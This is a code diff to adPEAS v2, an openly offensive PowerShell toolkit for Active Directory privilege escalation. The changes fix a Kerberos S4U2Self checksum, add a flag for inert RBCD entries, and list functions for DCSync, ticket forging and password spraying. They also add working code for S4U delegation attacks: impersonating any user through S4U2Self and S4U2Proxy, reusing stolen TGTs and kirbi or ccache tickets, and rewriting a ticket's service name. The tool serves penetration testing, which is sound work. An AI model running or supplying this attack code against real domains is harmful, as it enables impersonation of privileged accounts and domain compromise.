@@ -3,8 +3,8 @@
     adPEAS v2 - Active Directory Privilege Escalation Awesome Scripts
 
 .DESCRIPTION
-    Build: 2026-11-11 19:48:33
-    Version: 2.10.0
+    Build: 2026-11-12 10:22:48
+    Version: 2.10.1
 
     AUTHORIZED SECURITY TESTING ONLY!
 
@@ -1137,9 +1137,10 @@ $Script:GenericADRightsMap = @(
     already the mapped 0x000F01FF, not the raw 0x10000000 bit - so a plain
     "$ACE.ActiveDirectoryRights -band [ActiveDirectoryRights]::X" test fails for a
     GA-only ACE against every right X, GenericAll included: the ACE is invisible to the
-    check, not merely misclassified. An RBCD descriptor is written as
-    "O:BAD:(A;;GA;;;<sid>)" - what Invoke-RBCDOperation itself writes - so this is not a
-    theoretical case.
+    check, not merely misclassified. RBCD descriptors written as "O:BAD:(A;;GA;;;<sid>)"
+    exist in real directories - Invoke-RBCDOperation itself wrote that form until
+    2026-11-12, when it was measured that the KDC honours no generic bit there - so this
+    is not a theoretical case.
 
     Get-ObjectACL's .Rights/.RightsRaw already go through this mapping (via
     ConvertTo-ADRightsList below), so a check that reads those two properties does not
@@ -1271,9 +1272,9 @@ function ConvertTo-ExpandedADRightsName {
 
     The first was the generic access rights - see ConvertTo-ExpandedADRightsValue, which
     now does this mapping (moved out of this function, unchanged otherwise). That is not
-    a corner case: an RBCD descriptor is written as "O:BAD:(A;;GA;;;<sid>)", which is
-    what Invoke-RBCDOperation itself writes, so the most permissive ACE there used to be
-    displayed as blank.
+    a corner case: RBCD descriptors written as "O:BAD:(A;;GA;;;<sid>)" exist in real
+    directories (Invoke-RBCDOperation wrote that form until 2026-11-12), so the most
+    permissive ACE there used to be displayed as blank.
 
     The second was the substitution of a resolved extended right for the generic
     "ExtendedRight" label. Filtering with Where-Object collapses a one-element result to a
@@ -30656,6 +30657,7 @@ $Script:ObjectTypeDefinitions = [ordered]@{
         WhatWeCheck = @(
             "Computers, users and managed service accounts with msDS-AllowedToActOnBehalfOfOtherIdentity"
             "Which principals are allowed to delegate to the resource"
+            "Whether an entry grants anything: one with generic rights only (GA) is accepted by AD but ignored by the KDC, and is reported as inert"
             "Whether any of them is a broad group, or an identity this domain does not expect to delegate"
             "Whether the resource itself is a Domain Controller"
             "Not tested: who may write the attribute, which decides who can add themselves to it - the ACL and ownership sections answer that"
@@ -34816,8 +34818,11 @@ function Get-adPEASHelp {
         Show-KeyValue "Get-DomainGPO" "Query Group Policy Objects"
         Show-KeyValue "Get-DomainObject" "Query any AD object"
         Show-KeyValue "Get-ObjectACL" "Query object ACLs"
+        Show-KeyValue "Get-DomainWriteAccess" "What an account may write in the directory"
         Show-KeyValue "Get-CertificateTemplate" "Query certificate templates"
         Show-KeyValue "Get-CertificateAuthority" "Query certificate authorities"
+        Show-KeyValue "Get-DomainDNSZone" "Query AD-integrated DNS zones"
+        Show-KeyValue "Get-DomainDNSRecord" "Query AD-integrated DNS records"
         Show-EmptyLine
 
         # --- AD Modifications ---
@@ -34832,6 +34837,7 @@ function Get-adPEASHelp {
         Show-KeyValue "New-DomainComputer" "Create AD computer"
         Show-KeyValue "New-DomainGroup" "Create AD group"
         Show-KeyValue "New-DomainGPO" "Create Group Policy Object"
+        Show-KeyValue "Move-DomainObject" "Move or rename any AD object"
         Show-EmptyLine
 
         # --- Kerberos Authentication ---
@@ -34847,15 +34853,29 @@ function Get-adPEASHelp {
         Show-KeyValue "Invoke-ASREPRoast" "AS-REP Roasting (no preauth)"
         Show-KeyValue "Invoke-DCSync" "DCSync (directory replication)"
         Show-KeyValue "Invoke-PasswordSpray" "Password spraying"
+        Show-KeyValue "Get-Hash" "Derive NT/AES/DES keys from a password"
         Show-EmptyLine
 
         # --- Offensive Actions ---
         Show-Line "Offensive Actions:" -Class Hint
         Show-KeyValue "Invoke-TicketForge" "Golden/Silver/Diamond Tickets"
-        Show-KeyValue "Invoke-S4U" "S4U delegation attacks"
-        Show-KeyValue "Invoke-RBCDOperation" "Resource-Based Constrained Delegation"
-        Show-KeyValue "Invoke-ShadowCredentialOperation" "Shadow Credentials"
+        Show-KeyValue "Invoke-ConstrainedDelegation" "S4U attack via constrained delegation"
+        Show-KeyValue "Invoke-RBCD" "S4U attack via resource-based delegation"
+        Show-KeyValue "Invoke-S4U" "S4U2Self/S4U2Proxy from a secret or a TGT"
+        Show-KeyValue "Set-DomainComputer -AddRBCD" "Configure resource-based delegation"
+        Show-KeyValue "Set-DomainUser -AddShadowCredential" "Shadow Credentials"
         Show-KeyValue "Request-ADCSCertificate" "Request ADCS certificate"
+        Show-EmptyLine
+
+        # --- Network ---
+        Show-Line "Network:" -Class Hint
+        Show-KeyValue "Invoke-PortScan" "TCP connect scan of hosts, networks or the domain"
+        Show-EmptyLine
+
+        # --- Reporting ---
+        Show-Line "Reporting:" -Class Hint
+        Show-KeyValue "Convert-adPEASReport" "Rebuild HTML/text report from a JSON export"
+        Show-KeyValue "Compare-adPEASReport" "Compare two JSON exports"
         Show-EmptyLine
     }
 }
@@ -37442,15 +37462,14 @@ function Connect-adPEAS {
     No fallback available - requires valid ticket data.
 
 .PARAMETER ForceNTLM
-    Force NTLM impersonation, skipping Kerberos entirely.
+    Force an explicit NTLM bind, skipping Kerberos entirely.
     Only available for Username/Password and PSCredential authentication.
 
-    This method uses LogonUser() with LOGON32_LOGON_NEW_CREDENTIALS (similar to "runas /netonly"):
-    - Does NOT modify the Kerberos ticket cache
-    - Original Kerberos tickets remain intact
-    - Network operations use NTLM Challenge/Response authentication
-    - Supports LDAP Signing (unlike SimpleBind)
-    - Works even when LDAP Signing is enforced on the DC
+    The LDAP connection binds with AuthType Ntlm (Sicily) and the supplied credential:
+    - Does NOT touch the Kerberos ticket cache; the Windows logon's tickets are untouched
+    - The bind authenticates with NTLM Challenge/Response, not a logon impersonation
+    - Supports LDAP signing (unlike SimpleBind)
+    - Works even when LDAP signing is enforced on the DC
 
     Advantages over SimpleBind:
     - Credentials never sent in clear text
@@ -37575,8 +37594,9 @@ function Connect-adPEAS {
     No fallback - requires Kerberos (port 88 must be reachable).
 
 .EXAMPLE
-    Connect-adPEAS -Domain "contoso.com" -Username "admin" -NTHash "..." -ForceSimpleBind
-    Skips Kerberos and connects directly via SimpleBind with the hash.
+    Connect-adPEAS -Domain "contoso.com" -Username "admin" -Password "P@ssw0rd" -ForceSimpleBind
+    Skips Kerberos and connects directly via SimpleBind. SimpleBind needs a password;
+    -NTHash and the key parameters have no SimpleBind path and fail with -ForceSimpleBind.
 
 .EXAMPLE
     Connect-adPEAS -Domain "contoso.com" -Username "admin" -NTHash "..." -ForceKerberos
@@ -37584,13 +37604,13 @@ function Connect-adPEAS {
 
 .EXAMPLE
     Connect-adPEAS -Domain "contoso.com" -Username "admin" -Password "P@ssw0rd" -ForceNTLM
-    Connects using NTLM impersonation (runas /netonly style).
+    Connects with an explicit NTLM bind.
     Does NOT modify Kerberos ticket cache - original tickets remain intact.
     Supports LDAP Signing and works without LDAPS.
 
 .EXAMPLE
     Connect-adPEAS -Domain "contoso.com" -Credential (Get-Credential) -ForceNTLM
-    Connects using NTLM impersonation with PSCredential object.
+    Connects with an explicit NTLM bind using a PSCredential object.
 
 .EXAMPLE
     Connect-adPEAS -Domain "contoso.com" -Kirbi "ticket.kirbi"
@@ -38408,8 +38428,8 @@ function Connect-adPEAS {
                                 return $null
                             }
 
-                            Write-Log "[Connect-adPEAS] Kerberos PTT failed - trying NTLM impersonation fallback..."
-                            Show-Line "Kerberos failed - trying NTLM impersonation" -Class Info
+                            Write-Log "[Connect-adPEAS] Kerberos PTT failed - trying NTLM bind fallback..."
+                            Show-Line "Kerberos failed - trying NTLM" -Class Info
                         }
                     }
                     else {
@@ -40991,6 +41011,21 @@ function ConvertFrom-LDAPAttribute {
                                 # single one made the whole attribute $null - the resource
                                 # then looked unconfigured.
                                 if (-not $PrincipalName) { $PrincipalName = $Principal }
+
+                                # An entry whose mask holds no specific or standard right -
+                                # generic bits only, such as GA (0x10000000), the form
+                                # Invoke-RBCDOperation wrote until 2026-11-12 - names the
+                                # principal and grants it nothing. AD stores this attribute as
+                                # plain bytes and maps no generic right, and the KDC refused
+                                # S4U2Proxy for such an entry with KDC_ERR_BADOPTION while
+                                # accepting the same principal with 0x000F01FF (measured
+                                # against a Server 2019 DC). The name stays visible, marked;
+                                # Get-ResourceBasedConstrainedDelegation and the collector
+                                # read the mark. .NET hands the mask over unmapped here, and
+                                # calls 0x000F01FF "GenericAll" - hence the number, not the name.
+                                if ((([int]$ACE.ActiveDirectoryRights) -band 0x00FFFFFF) -eq 0) {
+                                    $PrincipalName = "$PrincipalName [inert: generic rights only]"
+                                }
                                 $rbcdPrincipals += $PrincipalName
                             }
                         }
@@ -47474,8 +47509,9 @@ function Get-DomainGPO {
     Analyzes all GPOs for dangerous ACL permissions.
 
 .EXAMPLE
-    Get-DomainGPO -ShowLinkedOU -ShowDangerousSettings -ShowPermissions
-    Complete security analysis of all GPOs.
+    Get-DomainGPO -Identity "Default Domain Policy" -ShowDangerousSettings -ShowPermissions
+    Complete security analysis of one GPO. Add -ShowLinkedOU in a separate call to list its
+    links: -ShowLinkedOU returns only the link DNs and replaces the GPO object.
 
 .EXAMPLE
     Get-DomainGPO -LDAPFilter "(displayName=*Admin*)"
@@ -47547,8 +47583,11 @@ function Get-DomainGPO {
                 return $Script:CachedAllGPOs
             }
 
-            # Validation: ShowLinkedOU requires Identity (ignore if not provided)
+            # Validation: ShowLinkedOU requires Identity (ignore if not provided). Warn, do
+            # not only log it: the switch changes what the function returns (link DNs instead
+            # of the GPO), so a caller that relied on it gets plain GPOs back without a word.
             if ($ShowLinkedOU -and -not $Identity) {
+                Write-Warning "[Get-DomainGPO] -ShowLinkedOU requires -Identity - ignoring it and returning GPO objects"
                 Write-Log "[Get-DomainGPO] -ShowLinkedOU requires -Identity parameter - ignoring ShowLinkedOU switch"
                 $ShowLinkedOU = $false
             }
@@ -49118,7 +49157,10 @@ function Set-CertificateTemplate {
     [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Low')]
     [OutputType([System.Management.Automation.PSCustomObject])]
     param(
-        [Parameter(Mandatory=$true, Position=0)]
+        # Not mandatory: -Import restores the templates named inside the backup file and does
+        # not use -Identity. Every other operation requires it, enforced in the process block
+        # with a clear message instead of a parameter-binding prompt.
+        [Parameter(Mandatory=$false, Position=0)]
         [Alias('Name')]
         [string]$Identity,
 
@@ -49218,6 +49260,12 @@ function Set-CertificateTemplate {
         }
 
         try {
+            # Identity is required for every operation except -Import, which takes the
+            # template names from the backup file. Enforced here so -Import works on its own.
+            if (-not $Import -and [string]::IsNullOrEmpty($Identity)) {
+                throw "Set-CertificateTemplate: -Identity is required unless -Import is used."
+            }
+
             # IMPORT MODE: Restore template(s) from JSON backup
             if ($Import) {
                 Write-Log "[Set-CertificateTemplate] Importing template(s) from: $Import"
@@ -79108,10 +79156,10 @@ function Invoke-ASREPRoast {
     - Password policy compliance testing
     - Identifying weak passwords before attackers do
 
-    Encryption Types:
-    - etype 23 (RC4-HMAC) = CRITICAL - Very fast to crack
-    - etype 17 (AES128) = HIGH - Harder to crack
-    - etype 18 (AES256) = MEDIUM - Strongest encryption
+    Encryption Types (severity from the central KERBEROS_ENCRYPTION_TYPES table):
+    - etype 23 (RC4-HMAC) = Critical - weak, very fast to crack
+    - etype 17 (AES128)   = Medium   - moderate security
+    - etype 18 (AES256)   = Low      - strong encryption
 
     Hash Format:
     - Output: $krb5asrep$etype$user@realm:checksum$encrypted_part
@@ -81092,7 +81140,14 @@ function Request-ServiceTicket {
                 $authPkgBytes = [System.Text.Encoding]::UTF8.GetBytes("Kerberos")
 
                 $checksumData = $nameTypeBytes + $nameBytes + $realmBytes + $authPkgBytes
-                $checksumValue = Get-HMACMD5 -Key $SessionKey -Data $checksumData
+                # MS-SFU 2.2.1: KERB_CHECKSUM_HMAC_MD5 (-138) with key usage 17
+                # (KERB_NON_KERB_CKSUM_SALT), keyed with the TGT session key whatever its type.
+                # That is the RFC 4757 keyed checksum - HMAC over MD5(usage || data) with a
+                # key derived from "signaturekey" - not a bare HMAC-MD5 of the data, which the
+                # KDC rejected with KRB_AP_ERR_MODIFIED on every S4U2Self (measured against a
+                # Server 2019 DC). Rubeus computes it the same way, through cryptdll; etype 23
+                # selects the -138 checksum in Get-KerberosChecksumNative.
+                $checksumValue = Get-KerberosChecksumNative -Key $SessionKey -Data $checksumData -KeyUsage 17 -EncryptionType 23
 
                 # Build Checksum structure: { cksumtype [0] Int32, checksum [1] OCTET STRING }
                 $checksumContent = @()
@@ -82003,16 +82058,211 @@ function Invoke-UnPACTheHash {
 
 # Invoke-S4U.ps1
 # S4U (Service for User) Attack Implementation
-# Supports Classic Constrained Delegation and Resource-Based Constrained Delegation (RBCD)
+# Supports S4U2Self alone, Classic Constrained Delegation (with or without protocol
+# transition) and Resource-Based Constrained Delegation (RBCD)
 #
 # Architecture:
+# - ConvertTo-S4UKrbCred: Internal - wraps an S4U service ticket in a KRB-CRED
+# - Read-S4UTicketInput: Internal - loads a .kirbi or ccache ticket (file path or Base64)
 # - Invoke-S4UCore: Internal function containing S4U workflow logic
+# - Invoke-S4U: Public, the general S4U command (credentials or a TGT, S4U2Self alone,
+#   S4U2Proxy, an evidence ticket instead of S4U2Self, resource-based)
 # - Invoke-ConstrainedDelegation: Public function for Classic CD (Scenario 1)
 # - Invoke-RBCD: Public function for RBCD attacks (Scenarios 2+3)
 
 # ============================================================================
-# LAYER 1: Internal Core Function
+# LAYER 1: Internal Helpers and Core Function
 # ============================================================================
+
+function ConvertTo-S4UKrbCred {
+    <#
+    .SYNOPSIS
+        Internal: wraps a service ticket from Request-ServiceTicket in a KRB-CRED.
+
+    .DESCRIPTION
+        Builds the KRB-CRED the way the logon path builds it for its own service tickets
+        (Invoke-KerberosAuthFlow): the SPN split into service class and host, the session
+        key labelled with the session key type, and the ticket's own flags and times.
+
+        Request-ServiceTicket returns two etypes. EncryptionType is the etype of the
+        TICKET - the key of the target service, which is what Kerberoasting needs.
+        SessionKeyType is the etype of the session key the client shares with that
+        service. A KRB-CRED that labels the session key with the ticket etype names the
+        wrong key type whenever the two differ - a target with RC4 keys only still gets an
+        AES session key - and the imported ticket cannot be used.
+
+        -RewriteTicket also writes the new service name into the Ticket itself, not only
+        into the KRB-CRED. The sname of a Ticket lies outside its encrypted part, so the
+        ticket stays valid for every service whose account holds the same key - cifs, host,
+        http, ldap and so on of one computer account.
+
+    .PARAMETER ServiceTicket
+        A successful result of Request-ServiceTicket.
+
+    .PARAMETER Realm
+        Realm of the client (the domain of the impersonated user).
+
+    .PARAMETER ClientName
+        The client the ticket was issued to (the impersonated user).
+
+    .PARAMETER ServerPrincipal
+        The service the KRB-CRED names: an SPN (service/host) or an account name (the
+        service of an S4U2Self ticket is the requesting account itself).
+
+    .PARAMETER RewriteTicket
+        Also replace the service name inside the Ticket (service-name substitution).
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [object]$ServiceTicket,
+
+        [Parameter(Mandatory=$true)]
+        [string]$Realm,
+
+        [Parameter(Mandatory=$true)]
+        [string]$ClientName,
+
+        [Parameter(Mandatory=$true)]
+        [string]$ServerPrincipal,
+
+        [Parameter(Mandatory=$false)]
+        [switch]$RewriteTicket
+    )
+
+    $nameParts = $ServerPrincipal -split '/', 2
+    $serverName = $nameParts[0]
+    $serverInstance = $null
+    if ($nameParts.Count -eq 2) { $serverInstance = $nameParts[1] }
+
+    $ticketBytes = [byte[]]$ServiceTicket.TicketBytes
+    if ($RewriteTicket) {
+        $parsedTicket = Read-KerberosTicket -TicketBytes $ticketBytes
+        if (-not $parsedTicket -or -not $parsedTicket.EncPart) {
+            throw "Cannot substitute the service name: the ticket could not be parsed"
+        }
+        $ticketRealm = $Realm
+        if ($parsedTicket.Realm) { $ticketRealm = $parsedTicket.Realm }
+        $ticketParams = @{
+            Realm          = $ticketRealm
+            ServerName     = $serverName
+            EncryptedPart  = [byte[]]$parsedTicket.EncPart
+            EncryptionType = [int]$parsedTicket.EType
+            Kvno           = [int]$parsedTicket.Kvno
+        }
+        if ($serverInstance) { $ticketParams['ServerInstance'] = $serverInstance }
+        $ticketBytes = New-KerberosTicket @ticketParams
+    }
+
+    # The session key type, not the ticket etype (see .DESCRIPTION). Request-ServiceTicket
+    # itself falls back to the enc-part etype when the reply names no key type.
+    $sessionKeyType = [int]$ServiceTicket.EncryptionType
+    if ($ServiceTicket.SessionKeyType) { $sessionKeyType = [int]$ServiceTicket.SessionKeyType }
+
+    $credParams = @{
+        Ticket         = [byte[]]$ticketBytes
+        SessionKey     = [byte[]]$ServiceTicket.SessionKeyBytes
+        SessionKeyType = $sessionKeyType
+        Realm          = $Realm.ToUpper()
+        ClientName     = $ClientName
+        ServerName     = $serverName
+    }
+    if ($serverInstance) { $credParams['ServerInstance'] = $serverInstance }
+    foreach ($field in @('TicketFlags', 'AuthTime', 'StartTime', 'EndTime', 'RenewTill')) {
+        if ($null -ne $ServiceTicket.$field) { $credParams[$field] = $ServiceTicket.$field }
+    }
+
+    # The comma, as in Build-KRBCred itself: without it the byte array is unrolled once more
+    # at this function's boundary and the caller gets an object[] instead of a byte[].
+    $krbCred = Build-KRBCred @credParams
+    return ,([byte[]]$krbCred)
+}
+
+function Read-S4UTicketInput {
+    <#
+    .SYNOPSIS
+        Internal: loads a Kerberos ticket from a .kirbi (KRB-CRED) or a ccache, given as a
+        file path or as Base64.
+
+    .DESCRIPTION
+        Returns the raw Ticket, its session key and key type, and the client and server
+        principal. A raw Ticket without its KRB-CRED is rejected: it carries neither the
+        session key S4U needs to sign its requests with a TGT, nor the name of the client
+        an evidence ticket was issued to.
+
+    .PARAMETER InputValue
+        File path, or Base64 of the file content.
+
+    .PARAMETER ParameterName
+        Name of the parameter the value came from, for the error messages.
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$InputValue,
+
+        [Parameter(Mandatory=$true)]
+        [string]$ParameterName
+    )
+
+    $loaded = ConvertFrom-Base64OrFile -InputValue $InputValue -ExpectedFormat 'Any' -ParameterName $ParameterName
+    if (-not $loaded -or -not $loaded.Success) {
+        $reason = 'the input could not be read'
+        if ($loaded -and $loaded.Error) { $reason = $loaded.Error }
+        throw "-${ParameterName}: $reason"
+    }
+    $data = [byte[]]$loaded.Data
+    if (-not $data -or $data.Length -lt 2) {
+        throw "-${ParameterName}: the ticket data is empty"
+    }
+
+    $ccacheVersion = ([int]$data[0] -shl 8) -bor [int]$data[1]
+
+    if ($data[0] -eq 0x76) {
+        $cred = Read-KRBCred -KirbiBytes $data
+        if (-not $cred -or -not $cred.Ticket) {
+            throw "-${ParameterName}: the KRB-CRED holds no ticket"
+        }
+        if (-not $cred.SessionKey) {
+            throw "-${ParameterName}: the credential part of this KRB-CRED is encrypted, so its session key and client cannot be read - export the ticket unencrypted, as Rubeus and Mimikatz write .kirbi files"
+        }
+        $serverName = $cred.ServerName
+        if (-not $serverName) { $serverName = $cred.TicketSName }
+        $clientRealm = $cred.ClientRealm
+        if (-not $clientRealm) { $clientRealm = $cred.TicketRealm }
+        return [PSCustomObject]@{
+            Format         = 'Kirbi'
+            Ticket         = [byte[]]$cred.Ticket
+            SessionKey     = [byte[]]$cred.SessionKey
+            SessionKeyType = [int]$cred.SessionKeyType
+            ClientName     = $cred.ClientName
+            ClientRealm    = $clientRealm
+            ServerName     = $serverName
+        }
+    }
+
+    if ($ccacheVersion -ge 0x0501 -and $ccacheVersion -le 0x0504) {
+        $cache = ConvertFrom-CcacheBytes -Bytes $data
+        if (-not $cache -or -not $cache.Ticket -or -not $cache.SessionKey) {
+            throw "-${ParameterName}: the ccache holds no usable credential"
+        }
+        return [PSCustomObject]@{
+            Format         = 'Ccache'
+            Ticket         = [byte[]]$cache.Ticket
+            SessionKey     = [byte[]]$cache.SessionKey
+            SessionKeyType = [int]$cache.SessionKeyType
+            ClientName     = $cache.ClientName
+            ClientRealm    = $cache.ClientRealm
+            ServerName     = $cache.ServerName
+        }
+    }
+
+    if ($data[0] -eq 0x61) {
+        throw "-${ParameterName}: this is a bare Ticket without its KRB-CRED - it carries no session key and no client name. Pass the .kirbi (KRB-CRED) or the ccache"
+    }
+
+    throw "-${ParameterName}: neither a .kirbi (KRB-CRED) nor a ccache (first byte 0x$($data[0].ToString('X2')))"
+}
 
 function Invoke-S4UCore {
     <#
@@ -82020,11 +82270,19 @@ function Invoke-S4UCore {
         Internal core function for S4U attacks. Not intended for direct use.
 
     .DESCRIPTION
-        Performs the complete S4U2Self + S4U2Proxy workflow with optional
-        AlternateService substitution and Pass-the-Ticket.
+        Performs the S4U workflow: the service account's TGT, S4U2Self, S4U2Proxy, with
+        optional service-name substitution and Pass-the-Ticket.
 
-        This is an internal function called by Invoke-ConstrainedDelegation
-        and Invoke-RBCD. Do not call directly.
+        This is an internal function called by Invoke-S4U, Invoke-ConstrainedDelegation
+        and Invoke-RBCD. Do not call directly. Variants:
+        - -TGTTicket (with -TGTSessionKey/-TGTSessionKeyType): the service account's TGT is
+          given, so no AS exchange is made and no secret of the account is needed.
+        - -EvidenceTicket: S4U2Self is skipped, and the given service ticket (impersonated
+          user -> service account) is the additional ticket of S4U2Proxy. That is
+          constrained delegation without protocol transition, where the KDC issues an
+          S4U2Self ticket that is not forwardable and S4U2Proxy refuses it.
+        - No -TargetSPN: S4U2Self alone; the result is the S4U2Self ticket, a ticket for
+          the impersonated user to the service account itself.
     #>
     [CmdletBinding()]
     param(
@@ -82034,7 +82292,8 @@ function Invoke-S4UCore {
         [Parameter(Mandatory=$true)]
         [string]$ImpersonateUser,
 
-        [Parameter(Mandatory=$true)]
+        # Empty: S4U2Self alone
+        [Parameter(Mandatory=$false)]
         [string]$TargetSPN,
 
         [Parameter(Mandatory=$true)]
@@ -82043,7 +82302,7 @@ function Invoke-S4UCore {
         [Parameter(Mandatory=$false)]
         [string]$Server,
 
-        # Service Account Authentication (one of these)
+        # Service Account Authentication (one of these, or the TGT below)
         [Parameter(Mandatory=$false)]
         [System.Management.Automation.PSCredential]$ServiceCredential,
 
@@ -82058,6 +82317,20 @@ function Invoke-S4UCore {
 
         [Parameter(Mandatory=$false)]
         [string]$ServiceAES128Key,
+
+        # The service account's TGT, instead of a secret
+        [Parameter(Mandatory=$false)]
+        [byte[]]$TGTTicket,
+
+        [Parameter(Mandatory=$false)]
+        [byte[]]$TGTSessionKey,
+
+        [Parameter(Mandatory=$false)]
+        [int]$TGTSessionKeyType,
+
+        # A service ticket impersonated user -> service account, instead of S4U2Self
+        [Parameter(Mandatory=$false)]
+        [byte[]]$EvidenceTicket,
 
         # Flags
         [Parameter(Mandatory=$false)]
@@ -82077,12 +82350,40 @@ function Invoke-S4UCore {
         Write-Log "[Invoke-S4UCore] Starting S4U workflow"
         Write-Log "[Invoke-S4UCore] Service Account: $ServiceAccount"
         Write-Log "[Invoke-S4UCore] Impersonate User: $ImpersonateUser"
-        Write-Log "[Invoke-S4UCore] Target SPN: $TargetSPN"
+        if ($TargetSPN) {
+            Write-Log "[Invoke-S4UCore] Target SPN: $TargetSPN"
+        } else {
+            Write-Log "[Invoke-S4UCore] Target SPN: none - S4U2Self alone"
+        }
         Write-Log "[Invoke-S4UCore] RBCD Mode: $UseRBCD"
     }
 
     process {
         try {
+            if (-not $TargetSPN -and ($EvidenceTicket -or $UseRBCD)) {
+                throw "An evidence ticket and resource-based delegation only apply to S4U2Proxy - specify -TargetSPN"
+            }
+
+            # Resolve the substituted SPNs before any request is made, so that an entry
+            # that cannot be resolved fails here and not after the Kerberos exchanges.
+            $targetHost = $null
+            if ($TargetSPN) {
+                $spnParts = $TargetSPN -split '/', 2
+                $targetHost = $TargetSPN
+                if ($spnParts.Count -ge 2) { $targetHost = $spnParts[1] }
+            }
+            $altSPNs = @()
+            foreach ($altSvc in @($AlternateService)) {
+                if (-not $altSvc) { continue }
+                if ($altSvc -match '/') {
+                    $altSPNs += $altSvc
+                } elseif ($targetHost) {
+                    $altSPNs += "$altSvc/$targetHost"
+                } else {
+                    throw "-AlternateService '$altSvc' needs a host when there is no -TargetSPN - give the full SPN, e.g. 'cifs/<host>'"
+                }
+            }
+
             # Resolve Server if not specified
             if (-not $Server) {
                 if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Server') -and $Script:LDAPContext['Server']) {
@@ -82105,135 +82406,140 @@ function Invoke-S4UCore {
                 }
             }
 
-            # Step 1: Get TGT for Service Account
-            Write-Log "[Invoke-S4UCore] Step 1: Requesting TGT for '$ServiceAccount'"
-
-            $authParams = @{
-                UserName         = $ServiceAccount
-                Domain           = $Domain
-                DomainController = $Server
+            # Step 1: the service account's TGT - given, or requested with its secret
+            if ($TGTTicket) {
+                if (-not $TGTSessionKey -or -not $TGTSessionKeyType) {
+                    throw "A supplied TGT needs its session key and session key type"
+                }
+                Write-Log "[Invoke-S4UCore] Step 1: Using the supplied TGT of '$ServiceAccount'"
+                $tgtTicketBytes = $TGTTicket
+                $tgtSessionKeyBytes = $TGTSessionKey
+                $tgtSessionKeyType = $TGTSessionKeyType
+                $tgtServer = $Server
             }
-
-            if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
-            elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
-            elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
-            elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
-            elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
             else {
-                throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
+                Write-Log "[Invoke-S4UCore] Step 1: Requesting TGT for '$ServiceAccount'"
+
+                $authParams = @{
+                    UserName         = $ServiceAccount
+                    Domain           = $Domain
+                    DomainController = $Server
+                }
+
+                if ($ServiceCredential) { $authParams['Credential'] = $ServiceCredential }
+                elseif ($ServicePassword) { $authParams['Password'] = $ServicePassword }
+                elseif ($ServiceNTHash) { $authParams['NTHash'] = $ServiceNTHash }
+                elseif ($ServiceAES256Key) { $authParams['AES256Key'] = $ServiceAES256Key }
+                elseif ($ServiceAES128Key) { $authParams['AES128Key'] = $ServiceAES128Key }
+                else {
+                    throw "Service account authentication required. Provide -ServiceCredential, -ServicePassword, -ServiceNTHash, -ServiceAES256Key, or -ServiceAES128Key"
+                }
+
+                $tgtResult = Invoke-KerberosAuth @authParams
+
+                if (-not $tgtResult -or -not $tgtResult.Success) {
+                    $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
+                    throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
+                }
+
+                $tgtTicketBytes = $tgtResult.TicketBytes
+                $tgtSessionKeyBytes = $tgtResult.SessionKeyBytes
+                $tgtSessionKeyType = $tgtResult.EncryptionType
+                $tgtServer = $tgtResult.DomainController
+                Write-Log "[Invoke-S4UCore] TGT acquired via $tgtServer (etype $($tgtResult.EncryptionType))"
             }
 
-            $tgtResult = Invoke-KerberosAuth @authParams
+            # Step 2: the ticket S4U2Proxy forwards - from S4U2Self, or the evidence ticket
+            $s4u2selfResult = $null
+            if ($EvidenceTicket) {
+                Write-Log "[Invoke-S4UCore] Step 2: Using the supplied evidence ticket instead of S4U2Self"
+                $additionalTicket = $EvidenceTicket
+            }
+            else {
+                Write-Log "[Invoke-S4UCore] Step 2: S4U2Self - requesting ticket on behalf of '$ImpersonateUser'"
 
-            if (-not $tgtResult -or -not $tgtResult.Success) {
-                $errMsg = if ($tgtResult) { $tgtResult.Error } else { "No result returned" }
-                throw "Failed to obtain TGT for '$ServiceAccount': $errMsg"
+                $s4u2selfResult = Request-ServiceTicket `
+                    -TGT $tgtTicketBytes `
+                    -SessionKey $tgtSessionKeyBytes `
+                    -SessionKeyType $tgtSessionKeyType `
+                    -ServicePrincipalName $ServiceAccount `
+                    -Domain $Domain `
+                    -DomainController $tgtServer `
+                    -UserName $ServiceAccount `
+                    -S4U2Self `
+                    -ImpersonateUser $ImpersonateUser
+
+                if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
+                    $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
+                    throw "S4U2Self failed: $errMsg"
+                }
+
+                Write-Log "[Invoke-S4UCore] S4U2Self succeeded (etype: $($s4u2selfResult.EncryptionType))"
+                $additionalTicket = $s4u2selfResult.TicketBytes
             }
 
-            $tgtServer = $tgtResult.DomainController
-            Write-Log "[Invoke-S4UCore] TGT acquired via $tgtServer (etype $($tgtResult.EncryptionType))"
+            # Step 3: S4U2Proxy - Constrained Delegation (skipped for S4U2Self alone)
+            if ($TargetSPN) {
+                Write-Log "[Invoke-S4UCore] Step 3: S4U2Proxy - forwarding ticket to '$TargetSPN'"
 
-            # Step 2: S4U2Self - Protocol Transition
-            Write-Log "[Invoke-S4UCore] Step 2: S4U2Self - requesting ticket on behalf of '$ImpersonateUser'"
+                $s4u2proxyParams = @{
+                    TGT                  = $tgtTicketBytes
+                    SessionKey           = $tgtSessionKeyBytes
+                    SessionKeyType       = $tgtSessionKeyType
+                    ServicePrincipalName = $TargetSPN
+                    Domain               = $Domain
+                    DomainController     = $tgtServer
+                    UserName             = $ServiceAccount
+                    S4U2Proxy            = $true
+                    AdditionalTicket     = $additionalTicket
+                    ImpersonateUser      = $ImpersonateUser
+                }
 
-            $s4u2selfResult = Request-ServiceTicket `
-                -TGT $tgtResult.TicketBytes `
-                -SessionKey $tgtResult.SessionKeyBytes `
-                -SessionKeyType $tgtResult.EncryptionType `
-                -ServicePrincipalName $ServiceAccount `
-                -Domain $Domain `
-                -DomainController $tgtServer `
-                -UserName $ServiceAccount `
-                -S4U2Self `
